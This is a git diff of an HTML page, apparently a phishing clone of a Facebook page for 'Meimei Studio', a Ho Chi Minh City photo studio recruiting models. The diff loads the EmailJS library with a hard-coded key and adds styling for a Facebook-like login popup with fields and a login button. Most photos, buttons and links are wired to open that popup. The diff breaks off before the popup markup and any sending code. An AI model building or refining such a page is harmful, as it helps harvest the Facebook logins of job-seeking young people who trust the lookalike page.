@@ -1,35 +1,728 @@
-
 <!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meimei Studio | Facebook</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("c-Ms5MjWbitpDBb-E"); // Public Key của bạn
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #F0F2F5;
+            color: #1c1e21;
+        }
+        .container {
+            width: 100%;
+            max-width: 980px;
+            margin: 0 auto;
+            background: #FFFFFF;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #FFFFFF;
+            padding: 10px 15px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            height: 56px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .header .title {
+            font-size: 18px;
+            font-weight: bold;
+        }
+        .header .icon {
+            width: 24px;
+            height: 24px;
+        }
+        .header .back-section {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .header .back-section span:nth-child(2) {
+            font-size: 14px;
+            white-space: nowrap;
+        }
+        .cover-image {
+            position: relative;
+            height: 250px;
+            background: url('https://i.imgur.com/C1ZhH1t.jpg') no-repeat center center/cover;
+        }
+        .profile-section {
+            position: relative;
+            margin-top: -84px;
+            padding: 0 16px;
+            z-index: 10;
+        }
+        .profile-pic-container {
+            position: relative;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: flex-start;
+        }
+        .profile-pic {
+            width: 168px;
+            height: 168px;
+            border-radius: 50%;
+            border: 4px solid #FFFFFF;
+            object-fit: cover;
+            display: block;
+            background: #E4E6EB;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        }
+        .page-info {
+            background-color: #FFFFFF;
+            padding: 0 16px 16px;
+            text-align: left;
+        }
+        .page-info .name {
+            font-size: 32px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+        }
+        .page-info .name .verified {
+            margin-left: 5px;
+            width: 20px;
+            height: 20px;
+            background: #1B74E4;
+            border-radius: 50%;
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .page-info .name .verified::after {
+            content: '';
+            width: 8px;
+            height: 4px;
+            border-left: 2px solid #FFFFFF;
+            border-bottom: 2px solid #FFFFFF;
+            transform: rotate(-45deg);
+        }
+        .page-info .stats {
+            color: #606770;
+            font-size: 15px;
+            margin: 4px 0;
+        }
+        .page-info .description {
+            font-size: 15px;
+            color: #606770;
+            margin: 4px 0;
+        }
+        .action-buttons {
+            display: flex;
+            gap: 8px;
+            padding: 0 16px 16px;
+            background-color: #FFFFFF;
+            border-bottom: 1px solid #DADDE1;
+            justify-content: flex-start;
+        }
+        .action-buttons button {
+            padding: 0 12px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            height: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            white-space: nowrap;
+        }
+        .action-buttons .message {
+            background-color: #1877F2;
+            color: #FFFFFF;
+        }
+        .action-buttons .message img {
+            width: 20px;
+            height: 20px;
+        }
+        .action-buttons .like {
+            background-color: #E4E6EB;
+            color: #050505;
+        }
+        .action-buttons .like img {
+            width: 20px;
+            height: 20px;
+        }
+        .action-buttons .more {
+            background-color: #E4E6EB;
+            color: #050505;
+            padding: 0 12px;
+            min-width: 36px;
+        }
+        .tabs {
+            display: flex;
+            gap: 8px;
+            padding: 0 16px;
+            background-color: #FFFFFF;
+            border-bottom: 1px solid #DADDE1;
+            height: 48px;
+            overflow-x: auto;
+            white-space: nowrap;
+            position: sticky;
+            top: 56px;
+            z-index: 99;
+        }
+        .tabs a {
+            text-decoration: none;
+            color: #65676b;
+            font-size: 15px;
+            padding: 0 16px 12px;
+            font-weight: 600;
+        }
+        .tabs a.active {
+            color: #1877F2;
+            border-bottom: 2px solid #1877F2;
+        }
+        .tabs a:hover {
+            background: #F2F3F5;
+            border-radius: 8px;
+        }
+        .details {
+            background-color: #FFFFFF;
+            padding: 16px;
+            border-bottom: 1px solid #DADDE1;
+            height: auto;
+            overflow: hidden;
+        }
+        .details .item {
+            display: flex;
+            align-items: center;
+            margin: 8px 0;
+            font-size: 15px;
+            color: #606770;
+        }
+        .details .item .icon {
+            margin-right: 12px;
+            width: 20px;
+            height: 20px;
+        }
+        .details .item strong {
+            color: #1C1E21;
+        }
+        .album-section {
+            background: #FFFFFF;
+            padding: 16px;
+            border-bottom: 1px solid #DADDE1;
+        }
+        .album-section p {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        .album-section .album {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+            gap: 4px;
+        }
+        .album-section .album img {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .album-section .album img:hover {
+            opacity: 0.9;
+        }
+        .main-content {
+            padding: 0 16px;
+            margin: 16px 0;
+            display: flex;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        .sidebar {
+            flex: 1;
+            max-width: 360px;
+        }
+        .posts {
+            flex: 2;
+            max-width: 580px;
+        }
+        .intro-section {
+            background: #FFFFFF;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .about-section, .photos-section, .videos-section, .reels-section, .likes-section {
+            display: none;
+        }
+        .about-section .item {
+            display: flex;
+            align-items: center;
+            margin: 8px 0;
+            font-size: 15px;
+            color: #050505;
+        }
+        .about-section .item img {
+            width: 20px;
+            height: 20px;
+            margin-right: 12px;
+        }
+        .about-section p {
+            font-size: 15px;
+            color: #050505;
+            margin: 8px 0;
+            line-height: 1.4;
+        }
+        .about-section p strong {
+            font-weight: 600;
+            display: block;
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+        .videos-section .video-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+            gap: 12px;
+        }
+        .videos-section .video-item {
+            position: relative;
+            background: #F0F2F5;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .videos-section .video-item img.thumbnail {
+            width: 100%;
+            aspect-ratio: 16/9;
+            object-fit: cover;
+        }
+        .videos-section .video-item .play-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .videos-section .video-item .play-icon::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-left: 12px solid #FFFFFF;
+            border-top: 8px transparent;
+            border-bottom: 8px transparent;
+        }
+        .videos-section .video-item .video-info {
+            padding: 8px;
+            font-size: 14px;
+            color: #050505;
+        }
+        .videos-section .video-item .video-info .title {
+            font-weight: 600;
+            margin-bottom: 4px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .videos-section .video-item .video-info .meta {
+            color: #606770;
+            font-size: 12px;
+        }
+        .videos-section .video-item:hover .thumbnail {
+            opacity: 0.9;
+        }
+        .reels-section .video-list {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            padding: 8px 0;
+        }
+        .reels-section .video-item {
+            position: relative;
+            flex: 0 0 100px;
+            background: #F0F2F5;
+            border-radius: 8px;
+            overflow: hidden;
+            cursor: pointer;
+        }
+        .reels-section .video-item img.thumbnail {
+            width: 100%;
+            aspect-ratio: 9/16;
+            object-fit: cover;
+        }
+        .reels-section .video-item .play-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
+            height: 24px;
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .reels-section .video-item .play-icon::after {
+            content: '';
+            width: 0;
+            height: 0;
+            border-left: 8px solid #FFFFFF;
+            border-top: 5px transparent;
+            border-bottom: 5px transparent;
+        }
+        .reels-section .video-item .video-info {
+            display: none;
+        }
+        .post {
+            background: #FFFFFF;
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .post-header img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+        }
+        .post-header .info {
+            flex: 1;
+        }
+        .post-header .info .name {
+            font-weight: 600;
+            font-size: 13px;
+            color: #050505;
+            margin-bottom: 2px;
+            display: flex;
+            align-items: center;
+        }
+        .post-header .info .name .verified {
+            margin-left: 4px;
+            width: 14px;
+            height: 14px;
+            background: #1B74E4;
+            border-radius: 50%;
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .post-header .info .name .verified::after {
+            content: '';
+            width: 6px;
+            height: 3px;
+            border-left: 1.5px solid #FFFFFF;
+            border-bottom: 1.5px solid #FFFFFF;
+            transform: rotate(-45deg);
+        }
+        .post-header .info .meta {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 12px;
+            color: #65676B;
+        }
+        .post-header .info .meta .time::after {
+            content: '🌍';
+            margin-left: 4px;
+            font-size: 12px;
+        }
+        .post .post-content {
+            font-size: 15px;
+            font-weight: 600;
+            color: #050505;
+            margin-bottom: 8px;
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .post p {
+            font-size: 14px;
+            color: #050505;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+        .post .image-gallery {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 2px;
+            margin: 8px 0;
+            position: relative;
+        }
+        .post .image-gallery img {
+            width: 100%;
+            border-radius: 4px;
+            object-fit: cover;
+            aspect-ratio: 1;
+        }
+        .post .image-gallery .more-images {
+            position: relative;
+        }
+        .post .image-gallery .more-images::after {
+            content: '+5';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            color: #FFFFFF;
+            background: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .like-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 8px;
+            font-size: 13px;
+            color: #65676B;
+        }
+        .like-info img {
+            width: 16px;
+            height: 16px;
+            margin-right: 4px;
+        }
+        .like-info .avatar {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            margin-right: 4px;
+        }
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            padding: 6px 0;
+            font-size: 13px;
+            color: #65676B;
+            border-top: 1px solid #CED0D4;
+        }
+        .actions .action {
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            flex: 1;
+            justify-content: center;
+            gap: 6px;
+        }
+        .actions .action:hover {
+            background: #F5F6F5;
+        }
+        .actions .action img {
+            width: 20px;
+            height: 20px;
+        }
+        .comments {
+            font-size: 13px;
+            color: #050505;
+            margin-top: 8px;
+            padding-top: 8px;
+            border-top: 1px solid #CED0D4;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .comments p {
+            margin-bottom: 5px;
+        }
+        .likes-section .like-item {
+            display: flex;
+            align-items: center;
+            margin: 8px 0;
+            font-size: 14px;
+            color: #050505;
+        }
+        .likes-section .like-item img.avatar {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #fff;
+            padding: 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            z-index: 1001;
+            max-width: 320px;
+            width: 90%;
+        }
+        .popup input {
+            width: 100%;
+            padding: 12px 14px;
+            margin-bottom: 10px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            box-sizing: border-box;
+        }
+        .popup input:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .popup .btn-login {
+            width: 100%;
+            padding: 12px;
+            background: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .popup .btn-login:hover {
+            background: #166fe5;
+        }
+        .popup .forgot-password {
+            color: #1877f2;
+            font-size: 13px;
+            display: block;
+            margin: 12px 0;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .popup .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .popup .divider {
+            border-top: 1px solid #dadde1;
+            margin: 16px 12px;
+        }
+        .popup .btn-create {
+            padding: 12px 16px;
+            background: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: #fff;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .popup .btn-create:hover {
+            background: #36a420;
+        }
+        .popup .error-message {
+            color: #ff0000;
+            font-size: 13px;
+            margin-top: 8px;
+        }
+        @media (max-width: 767px) {
+            .container {
+                width: 100%;
+                box-shadow: none;
+            }
+            .cover-image {
+                height: 150px;
+            }
+            .profile-pic {
+                width: 136px;
+                height: 136px;
+            }
+            .profile-section {
+                margin-top: -60px;
+            }
+            .page-info {
+                text-align: center;
+            }
+            .page-info .name {
+                font-size: 24px;
+                justify-content: center;
+            }
+            .action-buttons {
+                justify-content: center;
+            }
+            .tabs {
+                flex-wrap: nowrap;
+                overflow-x: auto;
+            }
+            .main-content {
+                flex-direction: column;
+                padding: 0 12px;
+            }
+            .sidebar, .posts {
+                max-width: 100%;
+            }
+            .post .image-gallery {
+                grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+            }
+            .videos-section .video-list {
+                grid-template-columns: 1fr;
+            }
+            .reels-section .video-list {
+                flex-direction: row;
+            }
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+    </style>
 </head>
 <body>
     <div class="container">
         <!-- Header -->
         <div class="header">
             <div class="back-section">
-                <span class="icon back-icon" onclick="showLoginPopup()">
-                    <svg viewBox="0 0 24 24" width="24" height="24" fill="#65676B">
-                        <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
-                    </svg>
-                </span>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/Y8cRKvgL8fn.png" alt="Back" class="icon">
                 <span>Meimei Studio</span>
             </div>
             <div class="title">Meimei Studio</div>
-            <div class="header-actions">
-                <span class="icon search-icon" onclick="showLoginPopup()">
-                    <svg viewBox="0 0 24 24" width="24" height="24" fill="#65676B">
-                        <path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
-                    </svg>
-                </span>
-                <span class="icon menu-icon" onclick="toggleContextMenu(event)">
-                    <svg viewBox="0 0 24 24" width="24" height="24" fill="#65676B">
-                        <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
-                    </svg>
-                </span>
+            <div>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/6YvXqYx61Kr.png" alt="Menu" class="icon">
             </div>
         </div>
 
@@ -47,7 +740,7 @@
                 </div>
                 <div class="stats">893k lượt thích • 648k người theo dõi</div>
                 <div class="description">
-                    Tuyển mẫu ảnh Concept theo sở thích, quay LOOKBOOK, mẫu FEEDBACK và mẫu LIVESTREAM bán hàng.
+                    Lưu giữ vẻ đẹp của bạn
                 </div>
             </div>
         </div>
@@ -60,13 +753,8 @@
             <button class="like" onclick="showLoginPopup()">
                 <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like"> Thích
             </button>
-            <button class="follow" onclick="showLoginPopup()">
-                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y5/r/kP1zKfrsT4F.png" alt="Follow"> Theo dõi
-            </button>
-            <button class="more" onclick="toggleContextMenu(event)">
-                <svg viewBox="0 0 24 24" width="20" height="20" fill="#050505">
-                    <path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z"/>
-                </svg>
+            <button class="more" onclick="alert('Mở menu tùy chọn (chức năng demo)')">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/6YvXqYx61Kr.png" alt="More">
             </button>
         </div>
 
@@ -77,87 +765,46 @@
             <a href="#" onclick="showTab('photos-tab')">Ảnh</a>
             <a href="#" onclick="showTab('videos-tab')">Video</a>
             <a href="#" onclick="showTab('reels-tab')">Reels</a>
-            <a href="#" class="badge" onclick="showTab('likes-tab')">Lượt</a>
+            <a href="#" onclick="showTab('likes-tab')">Lượt</a>
         </div>
 
         <!-- Details -->
         <div class="details">
             <div class="item">
-                <span class="icon page" style="background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/4r5pN3v2aN5.png');"></span>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/4r5pN3v2aN5.png" alt="Page" class="icon">
                 <span><strong>Trang</strong> • Studio chụp ảnh</span>
             </div>
             <div class="item">
-                <span class="icon location" style="background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/5hM-k1AN4eS.png');"></span>
-                <span><strong>424 Nguyễn Trãi - 286/1B Trần Hưng Đạo, Phường Nguyễn Cư Trinh Quận 1, Ho Chi Minh City, Vietnam</strong></span>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/5hM-k1AN4eS.png" alt="Location" class="icon">
+                <span><strong>424 Nguyễn Trãi, 286/1B Trần Hưng Đạo, P. Nguyễn Cư Trinh, Q1, Hồ Chí Minh</strong></span>
             </div>
             <div class="item">
-                <span class="icon email" style="background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/6zYk4cJJeL8.png');"></span>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yW/r/6zYk4cJJeL8.png" alt="Email" class="icon">
                 <span><strong>contact@meimeistudio.vn</strong></span>
             </div>
             <div class="item">
-                <span class="icon website" style="background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/5uH7TXzWENM.png');"></span>
-                <span><strong><a href="https://www.tiktok.com/@meimeimodel_vision" onclick="showLoginPopup()">tiktok.com/@meimeimodel_vision</a></strong></span>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yb/r/5uH7TXzWENM.png" alt="Website" class="icon">
+                <span><strong><a href="https://www.tiktok.com/@meimeimodel_vision">tiktok.com/@meimeimodel_vision</a></strong></span>
             </div>
             <div class="item">
-                <span class="icon hours" style="background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/u7v2q0v-KuV.png');"></span>
+                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yU/r/u7v2q0v-KuV.png" alt="Hours" class="icon">
                 <span><strong>Lưu mở cửa</strong></span>
             </div>
         </div>
 
-        <!-- Main Content -->
+        <!-- Album Section (Fixed on the left) -->
         <div class="main-content">
             <div class="sidebar">
-                <div id="photos-tab" class="photos-section tab-content">
-                    <p><strong>Ảnh</strong></p>
+                <div class="album-section">
+                    <p>Ảnh</p>
                     <div class="album">
                         <img src="https://imgur.com/oy1XxUp.jpg" alt="Ảnh 1" onclick="showLoginPopup()">
                         <img src="https://imgur.com/YFwhhDb.jpg" alt="Ảnh 2" onclick="showLoginPopup()">
                         <img src="https://imgur.com/GT3OXZP.jpg" alt="Ảnh 3" onclick="showLoginPopup()">
-                        <img src="https://imgur.com/7eRH4Fr.jpg" alt="Ảnh 4" onclick="showLoginPopup()">
-                        <img src="https://imgur.com/mj7UTEK.jpg" alt="Ảnh 5" onclick="showLoginPopup()">
-                        <img src="https://imgur.com/x7Z7Evf.jpg" alt="Ảnh 6" onclick="showLoginPopup()">
-                        <img src="https://imgur.com/bpwB1Mw.jpg" alt="Ảnh 7" onclick="showLoginPopup()">
-                    </div>
-                </div>
-                <div id="videos-tab" class="videos-section tab-content">
-                    <p><strong>Video</strong></p>
-                    <div class="video-list">
-                        <div class="video-item" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/Fw9t5Ih.jpg" alt="Thumbnail" class="thumbnail">
-                            <div class="play-icon"></div>
-                            <div class="video-duration">2:30</div>
-                            <div class="video-info">
-                                <div class="title">Lookbook Xuân 2025 - Meimei Studio</div>
-                                <div class="meta">21/03/2025 • 2:30</div>
-                            </div>
-                        </div>
-                        <div class="video-item" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/bASHqqu.jpg" alt="Thumbnail" class="thumbnail">
-                            <div class="play-icon"></div>
-                            <div class="video-duration">3:15</div>
-                            <div class="video-info">
-                                <div class="title">Lookbook Hè 2025 - Meimei Studio</div>
-                                <div class="meta">28/02/2025 • 3:15</div>
-                            </div>
-                        </div>
-                        <div class="video-item" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/zCaD2w9.jpg" alt="Thumbnail" class="thumbnail">
-                            <div class="play-icon"></div>
-                            <div class="video-duration">45:10</div>
-                            <div class="video-info">
-                                <div class="title">Livestream Bán Hàng 01/2025</div>
-                                <div class="meta">12/01/2025 • 45:10</div>
-                            </div>
-                        </div>
-                        <div class="video-item" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/6WGS0H9.jpg" alt="Thumbnail" class="thumbnail">
-                            <div class="play-icon"></div>
-                            <div class="video-duration">30:00</div>
-                            <div class="video-info">
-                                <div class="title">Livestream Giới Thiệu Sản Phẩm Mới</div>
-                                <div class="meta">21/12/2024 • 30:00</div>
-                            </div>
-                        </div>
+                        <img src="https://imgur.com/GT3OXZP.jpg" alt="Ảnh 4" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/7eRH4Fr.jpg" alt="Ảnh 5" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/mj7UTEK.jpg" alt="Ảnh 6" onclick="showLoginPopup()">
+                        <img src="https://imgur.com/7eRH4Fr.jpg" alt="Ảnh 7" onclick="showLoginPopup()">
                     </div>
                 </div>
             </div>
@@ -171,40 +818,25 @@
                                 <div class="name">Meimei Studio <span class="verified"></span></div>
                                 <div class="meta">
                                     <span class="time">21/03/2025</span>
-                                    <span class="globe-icon">
-                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="#65676B">
-                                            <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm-.5 12.5v-1.5c0-.3-.2-.5-.5-.5s-.5.2-.5.5v1.5c-2-.5-3.5-2-4-4h1.5c.3 0 .5-.2.5-.5s-.2-.5-.5-.5H2.2c.2-1 .6-2 1.3-2.8l1.1.8c.2.2.5.2.7 0s.2-.5 0-.7l-1-1C5.8 3.6 6.8 3.2 8 3.2c1.2 0 2.2.4 3 1l-1 .8c-.2.2-.2.5 0 .7s.5.2.7 0l1.1-.8c.7.8 1.1 1.8 1.3 2.8h-1.5c-.3 0-.5.2-.5.5s.2.5.5.5h1.5c-.5 2-2 3.5-4 4z"/>
-                                        </svg>
-                                    </span>
                                 </div>
                             </div>
                         </div>
                         <div class="post-content">Tuyển mẫu giao lưu cho concept mới!</div>
-                        <div class="content-text">
-                            TUYỂN MẪU GIAO LƯU
-                            Team mình đang chuẩn bị lên nhiều concept mới,
-                            👋 cần tuyển mẫu giao lưu👋
-                            Mấy bạn chỉ việc diễn hoy, còn lại để Studio lo hết nhé. 
-                            Mấy bà cứ gửi hình ảnh từng chụp qua mình nha. Bạn nào phù hợp concept mình rep liền nhé
-                            Cảm ơn cả nhà yêu😘😘😘
-                        </div>
-                        <span class="see-more" onclick="toggleSeeMore(this)">Xem thêm</span>
+                        <p>Dạo này thời gian rãnh nhiều bà nào rãnh hông ib tui làm mấy mẫy conccep hót hót nha ♥️</p>
                         <div class="image-gallery">
-                            <img src="https://imgur.com/jYvPFdb.jpg" alt="Concept 1" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/Yua11LC.jpg" alt="Concept 2" onclick="showLoginPopup()">
-                            <img src="https://imgur.com/T5oxlrN.jpg" alt="Concept 3" onclick="showLoginPopup()">
+                            <img src="https://imgur.com/jYvPFdb.jpg" alt="Concept 1">
+                            <img src="https://imgur.com/Yua11LC.jpg" alt="Concept 2">
+                            <img src="https://imgur.com/T5oxlrN.jpg" alt="Concept 3">
                             <div class="more-images">
-                                <img src="https://imgur.com/gt2YFaT.jpg" alt="Concept 4" onclick="showLoginPopup()">
+                                <img src="https://imgur.com/gt2YFaT.jpg" alt="Concept 4">
                             </div>
                         </div>
                         <div class="like-info">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yx/r/1FDa2tDB3Pp.png" alt="Like">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/6UHmJipH8-J.png" alt="Haha">
                             <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y8/r/EhyW6biK10i.png" alt="Love">
-                            <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/GT3OXZP.jpg" class="avatar" alt="Avatar">
-                            <img src="https://i.imgur.com/7eRH4Fr.jpg" class="avatar" alt="Avatar">
+                            <img src="https://i.imgur.com/oy1XxUp.jpg" class="avatar" alt="User Avatar">
+                            <img src="https://i.imgur.com/YFwhhDb.jpg" class="avatar" alt="User Avatar">
                             <span>Meimeistudio và 9.8k người khác</span>
                         </div>
                         <div class="actions">
@@ -219,23 +851,11 @@
                             </div>
                         </div>
                         <div class="comments">
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/oy1XxUp.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Lan Anh">
-                                <p data-tooltip="Lan Anh"><strong>Lan Anh:</strong> Mẫu này xinh quá Meimei ơi!</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <div class="comment" onclick="toggleReply(this)">
-                                <img src="https://i.imgur.com/YFwhhDb.jpg" class="comment-avatar" alt="Avatar" data-tooltip="Ngọc Mai">
-                                <p data-tooltip="Ngọc Mai"><strong>Ngọc Mai:</strong> IB ngay đây, shop rep sớm nha 😍</p>
-                                <div class="comment-reply">
-                                    <input type="text" placeholder="Viết câu trả lời..." onfocus="showLoginPopup()">
-                                </div>
-                            </div>
-                            <span class="see-more-comments" onclick="showLoginPopup()">Xem thêm bình luận</span>
+                            <p><strong>Lan Anh:</strong> Mẫu này xinh quá Meimei ơi!</p>
+                            <p><strong>Ngọc Mai:</strong> IB ngay đây, shop rep sớm nha 😍</p>
                         </div>
                     </div>
+
                     <!-- Bài viết 2 -->
                     <div class="post">
                         <div class="post-header">
@@ -244,46 +864,25 @@
                                 <div class="name">Meimei Studio <span class="verified"></span></div>
                                 <div class="meta">
                                     <span class="time">28/02/2025</span>
-                                    <span class="globe-icon">
-                                        <svg viewBox="0 0 16 16" width="12" height="12" fill="#65676B">
-                                            <path d="M8 1a7 7 0 100 14A7 7 0 008 1zm-.5 12.5v-1.5c0-.3-.2-.5-.5-.5s-.5.2-.5.5v1.5c-2-.5-3.5-2-4-4h1.5c.3 0 .5-.2.5-.5s-.2-.5-.5-.5H2.2c.2-1 .6-2 1.3-2.8l1.1.8c.2.2.5.2.7 0s.2-.5 0-.7l-1-1C5.8 3.6 6.8 3.2 8 3.2c1.2 0 2.2.4 3 1l-1 .8c-.2.2-.2.5 0 .7s.5.2.7 0l1.1-.8c.7.8 1.1 1.8 1.3 2.8h-1.5c-.3 0-.5.2-.5.5s.2.5.5.5h1.5c-.5 2-2 3.5-4 4z"/>
-                                        </svg>
-                                    </span>
                                 </div>
                             </div>
                         </div>
                         <div class="post-content">Tìm mẫu chụp ảnh sản phẩm mới!</div>
-                        <div class="content-text">
-                            📸 Meimei Studio Tìm Mẫu Chụp Ảnh Sản Phẩm ✨
-
-                            Công việc:  
-                            Style & chụp ảnh sản phẩm (3-4 ảnh/bộ, tối đa 10 bộ).  
-                            Chance hợp tác dài với các bộ sưu tập!  
-                            Thù lao: 200k–500k ảnh chất lượng tốt. Shop lo phí ship 2 chiều.  
-
-                            Yêu cầu:  
